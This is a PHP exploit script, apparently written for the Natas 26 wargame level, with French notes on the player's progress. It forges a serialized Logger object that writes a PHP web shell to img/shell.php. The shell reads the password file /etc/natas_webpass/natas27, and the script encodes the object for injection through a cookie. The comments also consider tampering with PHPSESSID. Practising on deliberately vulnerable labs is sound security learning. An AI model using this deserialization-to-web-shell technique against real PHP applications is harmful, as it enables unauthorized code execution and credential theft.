#!/bin/env php
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--I'm in!!--#\n";
            $this->exitMsg="Here is the password sir <? echo file_get_contents('/etc/natas_webpass/natas27');?>";
            $this->logFile = $file;
        }
    }
    
$object = 'Logger';
// $real_object = new $object('home');
$real_object = new $object('img/shell.php');
$serialized = serialize($real_object);
echo urlencode(base64_encode($serialized));

// $serialized = 'O:6:"Logger":3:{s:15:"LoggerlogFile";s:21:"/tmp/natas26_home.log";s:15:"LoggerinitMsg";s:22:"#--session started--#\n\t";s:15:"LoggerexitMsg";s:18:"#--session end--#\n\t";}';
// $unserialized = unserialize($serialized);
// echo $unserialized->logFile;


# Finalement, j'arrive à écrire dans le fichier que je veux en fournissant la string que je veux à la création
# de $real_object et je peux décider d'écrire ce que je veux en modifiant le message de fermeture. Par contre,
# je n'arrive pas à relire dans le fichier que j'ai créé après coup. Aussi, je n'arrive pas à écrire le contenu
# d'un autre fichier (celui qui nous intéresserait serait /etc/natas_webpass/natas26). J'ai essayé avec 
# file_get_contents, mais ce serait bien de réessayer. Le problème est que je dois d'abord réussir à lire ce que 
# j'ai écrit
# Il peut aussi être intéressant de manipuler le cookie PHPSESSID qui permet d'indiquer le fichier .png qui va
# contenir l'image affichée, mais les seules caractères acceptés sont a-z, A-Z et -...
?>